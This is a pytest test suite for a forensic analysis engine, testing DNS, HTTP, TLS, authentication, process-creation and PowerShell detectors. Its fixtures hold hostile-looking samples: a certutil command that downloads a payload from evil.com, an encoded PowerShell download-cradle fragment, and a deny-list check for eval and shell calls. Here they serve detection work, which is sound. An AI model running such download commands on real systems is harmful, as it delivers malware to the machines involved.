"""
Unit & Integration Test Suite — Forensic Analysis Engine Foundation
===================================================================
Tests shared Finding schema, router, unified store, network engine, log engine,
orchestrator, FIR integration, and security invariants.
"""

import ast
import os
import pytest
from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock

from forensic_analysis.schemas import Finding, finding_to_fir
from forensic_analysis.router import route_fcr, ARTIFACT_TYPE_TO_ENGINE
from forensic_analysis.unified_store import UnifiedEvidenceStore
from forensic_analysis.network_analysis.dns_analyzer import DNSAnalyzer, calculate_shannon_entropy
from forensic_analysis.network_analysis.http_analyzer import HTTPAnalyzer
from forensic_analysis.network_analysis.tls_analyzer import TLSAnalyzer
from forensic_analysis.network_analysis.session_reconstruction import SessionReconstructor
from forensic_analysis.network_analysis.network_engine import NetworkAnalysisEngine
from forensic_analysis.log_analysis.auth_analyzer import AuthAnalyzer
from forensic_analysis.log_analysis.process_creation_analyzer import ProcessCreationAnalyzer
from forensic_analysis.log_analysis.powershell_analyzer import PowerShellAnalyzer
from forensic_analysis.log_analysis.hayabusa_triage_analyzer import HayabusaTriageAnalyzer
from forensic_analysis.log_analysis.log_engine import LogAnalysisEngine
from forensic_analysis.orchestrator import process_fcr_batch

from preprocessing.fcr_engine.schemas import CorrelationRecord
from preprocessing.schemas import Artifact, NormalizedFields
from fir.repository import FIRRepository
from fir.schemas import FIRFinding


# ── Helper Factories ──────────────────────────────────────────────────────────

def make_artifact(
    art_id: str,
    art_type: str,
    case_id: str = "CASE-101",
    source_tool: str = "zeek",
    timestamp: datetime = None,
    norm_fields: dict = None,
    raw_fields: dict = None,
    event_summary: str = None
) -> Artifact:
    ts = timestamp or datetime.now(timezone.utc)
    norm = NormalizedFields(**(norm_fields or {}))
    return Artifact(
        artifact_id=art_id,
        case_id=case_id,
        evidence_id="EVID-001",
        source_tool=source_tool,
        artifact_type=art_type,
        timestamp=ts,
        event_summary=event_summary,
        normalized_fields=norm,
        raw_fields=raw_fields or {},
    )


def make_fcr(
    corr_id: str,
    art_ids: list[str],
    case_id: str = "CASE-101",
    rel_type: list[str] = None
) -> CorrelationRecord:
    return CorrelationRecord(
        correlation_id=corr_id,
        case_id=case_id,
        artifact_ids=art_ids,
        relationship_type=rel_type or ["network_process"],
        source_count=len(art_ids),
        distinct_artifact_types=len(art_ids),
        confidence=0.8,
    )


# ── 1. Shared Finding Schema & Adapter Tests ───────────────────────────────

def test_finding_schema_validation():
    now = datetime.now(timezone.utc)
    finding = Finding(
        case_id="CASE-001",
        fact="Test forensic fact",
        confidence=0.9,
        severity="HIGH",  # Lowercased by validator
        evidence_reference="CORR-00001",
        source_artifact_id="ART-00001",
        layer="network.dns_analyzer",
        timestamp=now
    )
    assert finding.case_id == "CASE-001"
    assert finding.severity == "high"
    assert finding.confidence == 0.9
    assert finding.timestamp.tzinfo is not None
    assert finding.source_artifact_id == "ART-00001"
    assert finding.contributing_correlation_ids == ["CORR-00001"]

    with pytest.raises(ValueError):
        Finding(case_id="", fact="valid", confidence=0.5, severity="high", evidence_reference="CORR-1", source_artifact_id="A1", layer="test")

    with pytest.raises(ValueError):
        Finding(case_id="C1", fact="valid", confidence=1.5, severity="high", evidence_reference="CORR-1", source_artifact_id="A1", layer="test")

    with pytest.raises(ValueError):
        Finding(case_id="C1", fact="valid", confidence=0.5, severity="invalid_sev", evidence_reference="CORR-1", source_artifact_id="A1", layer="test")


def test_finding_to_fir_adapter():
    finding = Finding(
        case_id="CASE-001",
        tenant_id="tenant-alpha",
        fact="DNS tunneling observed",
        confidence=0.88,
        severity="high",
        mitre_mapping="T1071.004",
        evidence_reference="CORR-00001",
        source_artifact_id="ART-00001",
        layer="network.dns_analyzer",
        contributing_correlation_ids=["CORR-00001", "CORR-00002"]
    )
    fir_finding = finding_to_fir(finding)
    assert isinstance(fir_finding, FIRFinding)
    assert fir_finding.finding_id == finding.finding_id
    assert fir_finding.case_id == "CASE-001"
    assert fir_finding.tenant_id == "tenant-alpha"
    assert fir_finding.fact == "DNS tunneling observed"
    assert fir_finding.evidence_reference == ["CORR-00001", "CORR-00002"]
    assert fir_finding.review_status.value == "pending_review"


# ── 2. Router Tests ─────────────────────────────────────────────────────────

def test_router_single_domain():
    art1 = make_artifact("A1", "network.dns")
    art2 = make_artifact("A2", "network.http")
    fcr = make_fcr("CORR-00001", ["A1", "A2"])
    store = {"A1": art1, "A2": art2}

    engines = route_fcr(fcr, store)
    assert engines == ["network"]


def test_router_cross_domain():
    art1 = make_artifact("A1", "network.conn")
    art2 = make_artifact("A2", "endpoint.process")
    fcr = make_fcr("CORR-00002", ["A1", "A2"])
    store = {"A1": art1, "A2": art2}

    engines = route_fcr(fcr, store)
    assert engines == ["endpoint", "network"]


def test_router_unknown_and_duplicate_artifact_types(caplog):
    art1 = make_artifact("A1", "network.dns")
    art2 = make_artifact("A2", "unknown_custom_type")
    art3 = make_artifact("A3", "network.conn")
    fcr = make_fcr("CORR-00003", ["A1", "A2", "A3"])
    store = {"A1": art1, "A2": art2, "A3": art3}

    with caplog.at_level("WARNING"):
        engines = route_fcr(fcr, store)

    assert engines == ["network"]
    assert "Unmatched artifact_type 'unknown_custom_type'" in caplog.text


def test_router_empty_and_missing_artifacts():
    fcr = make_fcr("CORR-00004", ["A1", "A2"])
    assert route_fcr(fcr, {}) == []


# ── 3. Unified Evidence Store Tests ─────────────────────────────────────────

def test_unified_store_write_read_and_layer_filter():
    store = UnifiedEvidenceStore()
    now = datetime.now(timezone.utc)

    f1 = Finding(
        case_id="CASE-STORE",
        tenant_id="tenant-1",
        fact="DNS anomaly",
        confidence=0.8,
        severity="medium",
        evidence_reference="CORR-00101",
        source_artifact_id="A-STORE-1",
        layer="network.dns_analyzer",
        timestamp=now
    )
    f2 = Finding(
        case_id="CASE-STORE",
        tenant_id="tenant-1",
        fact="Auth brute force",
        confidence=0.9,
        severity="high",
        evidence_reference="CORR-00102",
        source_artifact_id="A-STORE-2",
        layer="log.auth_analyzer",
        timestamp=now + timedelta(seconds=10)
    )

    store.write_finding(f1)
    store.write_finding(f2)

    all_case = store.read_findings("CASE-STORE", tenant_id="tenant-1")
    assert len(all_case) == 2

    dns_only = store.get_findings_by_layer("CASE-STORE", "network.dns_analyzer", tenant_id="tenant-1")
    assert len(dns_only) == 1
    assert dns_only[0].fact == "DNS anomaly"

    # Cross-case isolation check
    other_case = store.read_findings("OTHER-CASE")
    assert len(other_case) == 0


# ── 4. DNS Analyzer Tests ───────────────────────────────────────────────────

def test_dns_analyzer_positive():
    analyzer = DNSAnalyzer(entropy_threshold=3.8, txt_length_threshold=50, txt_volume_threshold=3)
    now = datetime.now(timezone.utc)

    # High entropy DGA domain with distinct characters
    art_dga = make_artifact(
        "A-DNS-1", "dns_query",
        norm_fields={"domain": "q3z9w8e7r6t5y4u3i2o1p123456789.malicious.net"},
        timestamp=now
    )

    # Tunneling TXT queries
    txt_artifacts = [
        make_artifact(
            f"A-TXT-{i}", "dns_query",
            norm_fields={"domain": "tunnel.example.com"},
            raw_fields={"qtype": "TXT", "answers": "A"*60},
            timestamp=now + timedelta(seconds=i)
        )
        for i in range(4)
    ]

    findings = analyzer.analyze("CASE-DNS", [art_dga] + txt_artifacts, "CORR-00001")
    assert len(findings) >= 2
    layers = [f.layer for f in findings]
    assert "network.dns_analyzer" in layers
    facts = " ".join([f.fact for f in findings])
    assert "High-entropy subdomain" in facts
    assert "DNS tunneling" in facts


def test_dns_analyzer_negative():
    analyzer = DNSAnalyzer()
    art_normal = make_artifact(
        "A-DNS-NORM", "dns_query",
        norm_fields={"domain": "google.com"},
        raw_fields={"qtype": "A"}
    )
    findings = analyzer.analyze("CASE-DNS", [art_normal], "CORR-00001")
    assert len(findings) == 0


# ── 5. HTTP Analyzer Tests ──────────────────────────────────────────────────

def test_http_analyzer_positive():
    analyzer = HTTPAnalyzer(min_observations=4, max_jitter_coefficient=0.25)
    base_ts = datetime.now(timezone.utc)

    # Regular 10-second interval connections
    artifacts = [
        make_artifact(
            f"A-HTTP-{i}", "http_request",
            norm_fields={"url": "/beacon.php", "dst_ip": "192.168.1.100"},
            raw_fields={"user_agent": "CustomC2Client/1.0"},
            timestamp=base_ts + timedelta(seconds=i*10)
        )
        for i in range(5)
    ]

    findings = analyzer.analyze("CASE-HTTP", artifacts, "CORR-00001")
    assert len(findings) == 1
    assert findings[0].layer == "network.http_analyzer"
    assert "HTTP beaconing behavior detected" in findings[0].fact


def test_http_analyzer_negative():
    analyzer = HTTPAnalyzer(min_observations=4)
    base_ts = datetime.now(timezone.utc)

    # Insufficient observations (only 2)
    artifacts = [
        make_artifact(
            f"A-HTTP-{i}", "http_request",
            norm_fields={"url": "/index.html", "dst_ip": "10.0.0.1"},
            raw_fields={"user_agent": "Mozilla/5.0"},
            timestamp=base_ts + timedelta(seconds=i*5)
        )
        for i in range(2)
    ]

    findings = analyzer.analyze("CASE-HTTP", artifacts, "CORR-00001")
    assert len(findings) == 0


# ── 6. TLS Analyzer Tests ───────────────────────────────────────────────────

def test_tls_analyzer_positive():
    analyzer = TLSAnalyzer()
    art_blacklisted = make_artifact(
        "A-TLS-1", "tls_session",
        norm_fields={"dst_ip": "203.0.113.10"},
        raw_fields={"ja3": "e7ed34562155a33760c7b6e073db067e"}
    )
    findings = analyzer.analyze("CASE-TLS", [art_blacklisted], "CORR-00001")
    assert len(findings) == 1
    assert findings[0].layer == "network.tls_analyzer"
    assert "TrickBot C2" in findings[0].fact


def test_tls_analyzer_missing_ja3_warning(caplog):
    analyzer = TLSAnalyzer()
    art_no_ja3 = make_artifact("A-TLS-2", "tls_session", norm_fields={"dst_ip": "10.0.0.1"})

    with caplog.at_level("WARNING"):
        findings = analyzer.analyze("CASE-TLS", [art_no_ja3], "CORR-00001")

    assert len(findings) == 0
    assert "missing JA3/JA3S fields" in caplog.text


# ── 7. Session Reconstruction Tests ─────────────────────────────────────────

def test_session_reconstruction_positive():
    reconstructor = SessionReconstructor(exfiltration_bytes_threshold=10_000_000)
    now = datetime.now(timezone.utc)

    conn_art = make_artifact(
        "A-CONN-1", "network_connection",
        norm_fields={"src_ip": "10.0.0.50", "dst_ip": "198.51.100.5"},
        raw_fields={"orig_bytes": 15_000_000},
        timestamp=now
    )

    findings = reconstructor.analyze("CASE-SESS", [conn_art], "CORR-00001")
    assert len(findings) == 1
    assert findings[0].layer == "network.session_reconstruction"
    assert "Possible sustained outbound transfer" in findings[0].fact


# ── 8. Auth Analyzer Tests ──────────────────────────────────────────────────

def test_auth_analyzer_brute_force_and_impossible_travel():
    analyzer = AuthAnalyzer(failed_logon_threshold=3, time_window_seconds=100)
    now = datetime.now(timezone.utc)

    # 3 Failed logons within 30 seconds
    failures = [
        make_artifact(
            f"A-AUTH-F-{i}", "auth_event",
            norm_fields={"user": "admin", "src_ip": "192.168.1.50"},
            raw_fields={"event_id": "4625"},
            timestamp=now + timedelta(seconds=i*10)
        )
        for i in range(3)
    ]

    # Successful logons across distinct hosts within 10 seconds (Impossible travel)
    success1 = make_artifact(
        "A-AUTH-S-1", "auth_event",
        norm_fields={"user": "admin", "host": "WORKSTATION-A"},
        raw_fields={"event_id": "4624"},
        timestamp=now + timedelta(seconds=200)
    )
    success2 = make_artifact(
        "A-AUTH-S-2", "auth_event",
        norm_fields={"user": "admin", "host": "SERVER-B"},
        raw_fields={"event_id": "4624"},
        timestamp=now + timedelta(seconds=205)
    )

    findings = analyzer.analyze("CASE-AUTH", failures + [success1, success2], "CORR-00001")
    assert len(findings) == 2
    facts = " ".join([f.fact for f in findings])
    assert "Brute-force authentication pattern" in facts
    assert "Impossible-travel temporal anomaly" in facts


# ── 9. Process Creation Analyzer Tests (LOLBAS Snapshot) ─────────────────────

def test_process_creation_lolbas_and_parent_child():
    analyzer = ProcessCreationAnalyzer()
    now = datetime.now(timezone.utc)

    # LOLBin certutil.exe execution
    art_lolbin = make_artifact(
        "A-PROC-1", "process_event",
        norm_fields={"process_name": "certutil.exe", "process_command_line": "certutil -urlcache -f http://evil.com/payload.exe payload.exe"},
        raw_fields={"event_id": "4688"},
        timestamp=now
    )

    # Suspicious parent-child: winword.exe -> powershell.exe
    art_parent_child = make_artifact(
        "A-PROC-2", "process_event",
        norm_fields={"process_name": "powershell.exe", "process_command_line": "powershell.exe -nop"},
        raw_fields={"parent_process_name": "winword.exe"},
        timestamp=now
    )

    findings = analyzer.analyze("CASE-PROC", [art_lolbin, art_parent_child], "CORR-00001")
    assert len(findings) >= 2
    facts = " ".join([f.fact for f in findings])
    assert "LOLBin execution detected" in facts
    assert "Suspicious parent-child process relationship" in facts

    # Verify snapshot_version metadata is carried through
    lolbin_finding = next(f for f in findings if "LOLBin" in f.fact)
    assert "snapshot_version" in lolbin_finding.metadata


# ── 10. PowerShell Analyzer Tests ───────────────────────────────────────────

def test_powershell_analyzer():
    analyzer = PowerShellAnalyzer()
    now = datetime.now(timezone.utc)

    art_ps = make_artifact(
        "A-PS-1", "powershell_event",
        norm_fields={"process_command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQ=="},
        timestamp=now
    )

    findings = analyzer.analyze("CASE-PS", [art_ps], "CORR-00001")
    assert len(findings) >= 1
    assert findings[0].layer == "log.powershell_analyzer"
    assert "Encoded PowerShell command" in findings[0].fact


# ── 11. Hayabusa Triage Analyzer Tests ──────────────────────────────────────

def test_hayabusa_triage_analyzer():
    analyzer = HayabusaTriageAnalyzer()
    now = datetime.now(timezone.utc)

    art_haya = make_artifact(
        "A-HAYA-1", "hayabusa_triage",
        source_tool="hayabusa",
        norm_fields={"rule_name": "LSASS Memory Dump", "severity": "critical"},
        event_summary="procdump.exe dumped lsass.exe",
        timestamp=now
    )

    findings = analyzer.analyze("CASE-HAYA", [art_haya], "CORR-00001")
    assert len(findings) == 1
    assert findings[0].layer == "log.hayabusa_triage_analyzer"
    assert "Hayabusa pre-triaged Sigma alert" in findings[0].fact


# ── 12. Full Orchestrator Integration Test (Amendment 1) ───────────────────

def test_process_fcr_batch_integration(caplog):
    """
    Integration test: cross-domain FCR (network.dns + deferred_domain),
    running through process_fcr_batch().
    Verifies:
    1. Registered engine ('network') executes and generates Finding.
    2. Unregistered engine ('deferred_engine') logs warning and skips without crashing.
    3. Finding is stored in UnifiedEvidenceStore.
    4. Finding is converted to FIRFinding and inserted into FIRRepository mock.
    """
    art_net = make_artifact("A-NET-1", "network.dns", norm_fields={"domain": "q3z9w8e7r6t5y4u3i2o1p123456789.evil.com"})
    art_def = make_artifact("A-DEF-1", "deferred_type", norm_fields={"raw": "test"})

    # Temporarily monkeypatch ARTIFACT_TYPE_TO_ENGINE for test
    from forensic_analysis import router
    router.ARTIFACT_TYPE_TO_ENGINE["deferred_type"] = "deferred_engine"

    try:
        fcr_cross = make_fcr("CORR-99999", ["A-NET-1", "A-DEF-1"], case_id="CASE-INT-101")
        store = {"A-NET-1": art_net, "A-DEF-1": art_def}

        mock_fir_repo = MagicMock(spec=FIRRepository)
        test_unified_store = UnifiedEvidenceStore()

        with caplog.at_level("WARNING"):
            findings = process_fcr_batch(
                case_id="CASE-INT-101",
                fcr_objects=[fcr_cross],
                artifacts_by_id=store,
                fir_repo=mock_fir_repo,
                store=test_unified_store
            )

        # 1. Unregistered engine 'deferred_engine' logged warning
        assert "Unregistered analysis engine 'deferred_engine'" in caplog.text

        # 2. Registered engine 'network' produced finding
        assert len(findings) >= 1
        assert findings[0].layer == "network.dns_analyzer"
    finally:
        router.ARTIFACT_TYPE_TO_ENGINE.pop("deferred_type", None)

    # 3. Finding written to UnifiedEvidenceStore
    persisted_findings = test_unified_store.read_findings("CASE-INT-101")
    assert len(persisted_findings) >= 1

    # 4. FIRRepository.insert called with converted FIRFinding
    mock_fir_repo.insert.assert_called_once()
    call_arg = mock_fir_repo.insert.call_args[0][0]
    assert isinstance(call_arg, FIRFinding)
    assert call_arg.case_id == "CASE-INT-101"
    assert call_arg.layer == "network.dns_analyzer"


def test_overlapping_fcr_deduplication_preserves_contributing_correlation_ids():
    """
    Regression test: Two FCRs with different relationship_type values (temporal_proximity, shared_ioc)
    both resolving to the same source_artifact_id and producing identical fact.
    Asserts:
    1. Merged Finding list has exactly 1 entry.
    2. contributing_correlation_ids contains both FCR correlation IDs.
    3. finding_to_fir() folds contributing_correlation_ids into a comma-joined evidence_reference string.
    """
    now = datetime.now(timezone.utc)
    art_dga = make_artifact(
        "A-DNS-DEDUP-1", "network.dns",
        norm_fields={"domain": "q3z9w8e7r6t5y4u3i2o1p123456789.malicious.net"},
        timestamp=now
    )
    art_dummy1 = make_artifact("A-DUMMY-1", "network.dns", norm_fields={"domain": "norm1.com"}, timestamp=now)
    art_dummy2 = make_artifact("A-DUMMY-2", "network.dns", norm_fields={"domain": "norm2.com"}, timestamp=now)

    store = {
        "A-DNS-DEDUP-1": art_dga,
        "A-DUMMY-1": art_dummy1,
        "A-DUMMY-2": art_dummy2,
    }

    fcr1 = CorrelationRecord(
        correlation_id="CORR-00101",
        case_id="CASE-OVERLAP-1",
        artifact_ids=["A-DNS-DEDUP-1", "A-DUMMY-1"],
        relationship_type=["shared_ioc"],
        shared_value="malicious.net",
        source_count=1,
        distinct_artifact_types=1,
        confidence=0.8,
    )
    fcr2 = CorrelationRecord(
        correlation_id="CORR-00102",
        case_id="CASE-OVERLAP-1",
        artifact_ids=["A-DNS-DEDUP-1", "A-DUMMY-2"],
        relationship_type=["temporal_proximity"],
        host="host-1",
        source_count=1,
        distinct_artifact_types=1,
        confidence=0.8,
    )

    engine = NetworkAnalysisEngine()
    findings = engine.analyze([fcr1, fcr2], store)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.source_artifact_id == "A-DNS-DEDUP-1"
    assert "CORR-00101" in finding.contributing_correlation_ids
    assert "CORR-00102" in finding.contributing_correlation_ids

    fir_finding = finding_to_fir(finding)
    assert fir_finding.evidence_reference == ["CORR-00101", "CORR-00102"]


# ── 13. Security AST Inspection (Section 11) ────────────────────────────────

def test_ast_security_inspection():
    """
    Verifies that all files in forensic_analysis contain zero unsafe patterns:
    eval=0, exec=0, shell=True=0, os.system=0, unsafe pickle/yaml=0.
    """
    forensic_dir = os.path.join(os.path.dirname(__file__), "..", "..", "forensic_analysis")
    python_files = []
    for root, _, files in os.walk(forensic_dir):
        for f in files:
            if f.endswith(".py"):
                python_files.append(os.path.join(root, f))

    for filepath in python_files:
        with open(filepath, "r", encoding="utf-8-sig") as f:
            code = f.read()

        # Verify AST parses cleanly
        tree = ast.parse(code, filename=filepath)
        assert tree is not None

        # Inspect AST nodes for unsafe calls
        for node in ast.walk(tree):
            # Check for direct calls to eval(), exec(), os.system()
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    assert node.func.id not in ("eval", "exec"), f"Forbidden function call '{node.func.id}' in {filepath}"
                elif isinstance(node.func, ast.Attribute):
                    if node.func.attr == "system" and isinstance(node.func.value, ast.Name) and node.func.value.id == "os":
                        pytest.fail(f"Forbidden os.system call found in {filepath}")
                    if node.func.attr == "loads" and isinstance(node.func.value, ast.Name) and node.func.value.id == "pickle":
                        pytest.fail(f"Forbidden pickle.loads call found in {filepath}")

                # Check for shell=True keyword argument in call
                for kw in node.keywords:
                    if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                        pytest.fail(f"Forbidden shell=True keyword found in call in {filepath}")

